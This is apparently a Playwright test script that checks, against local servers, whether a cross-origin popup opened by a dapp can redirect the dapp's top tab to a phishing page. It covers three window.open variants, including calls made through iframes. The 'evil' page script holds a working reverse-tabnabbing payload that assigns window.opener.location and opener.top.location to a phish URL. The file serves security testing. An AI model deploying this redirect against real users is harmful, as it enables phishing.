// Experiment: can a cross-origin popup, opened to an ARBITRARY url, navigate the dapp's top-level tab?
// Variant A: dapp calls window.open directly.  Variant B: dapp calls window.open from a same-origin
// about:blank iframe it created (so popup.opener is the iframe window, not the top window).
import http from "node:http";
import { chromium, webkit, firefox } from "playwright";

const serve = (port, handler) => new Promise((r) => { const s = http.createServer(handler); s.listen(port, "127.0.0.1", () => r(s)); });
const html = (res, body) => { res.writeHead(200, { "content-type": "text/html" }); res.end(body); };

const dapp = await serve(5301, (req, res) => html(res, `<!doctype html><title>dapp</title>
<button id=a>open A (direct)</button><button id=b>open B (via iframe)</button><button id=c>open C (iframe created inside the click)</button>
<script>
const url = "http://127.0.0.1:5302/evil.html";
document.getElementById("a").onclick = () => { window.open(url, "wA", "popup,width=400,height=400"); };
const f = document.createElement("iframe"); f.style.display = "none"; document.body.appendChild(f);
document.getElementById("b").onclick = () => { const w = f.contentWindow.open(url, "wB", "popup,width=400,height=400"); document.title = "dapp:b-open=" + (w ? "ok" : "BLOCKED"); };
document.getElementById("c").onclick = () => { const g = document.createElement("iframe"); g.style.display = "none"; document.body.appendChild(g); const w = g.contentWindow.open(url, "wC", "popup,width=400,height=400"); document.title = "dapp:c-open=" + (w ? "ok" : "BLOCKED"); };
</script>`));
const phish = await serve(5303, (req, res) => html(res, "<title>PHISH</title>phish"));
const evil = await serve(5302, (req, res) => html(res, `<!doctype html><title>evil</title><script>
const log = [];
try { window.opener.location = "http://127.0.0.1:5303/via-opener"; log.push("opener.location=ok"); } catch (e) { log.push("opener.location=ERR " + e.name); }
setTimeout(() => {
  try { window.opener.top.location = "http://127.0.0.1:5303/via-opener-top"; log.push("opener.top.location=ok"); } catch (e) { log.push("opener.top.location=ERR " + e.name); }
  document.title = log.join(" | ");
}, 300);
</script>`));

const browser = await ({ chromium, webkit, firefox })[process.argv[2] ?? "chromium"].launch();
console.log("chromium", browser.version());
for (const v of ["a", "b", "c"]) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto("http://127.0.0.1:5301/");
  const popupP = ctx.waitForEvent("page", { timeout: 4000 }).catch(() => null);
  await page.click("#" + v);
  const popup = await popupP;
  await page.waitForTimeout(1500);
  console.log(`variant ${v}: popup=${popup ? "opened" : "BLOCKED"}  dappTopUrl=${page.url()}  dappTitle="${await page.title().catch(() => "?")}"`);
  if (popup) console.log("   evil log:", await popup.title().catch(() => "?"));
  await ctx.close();
}
await browser.close();
for (const s of [dapp, evil, phish]) s.close();
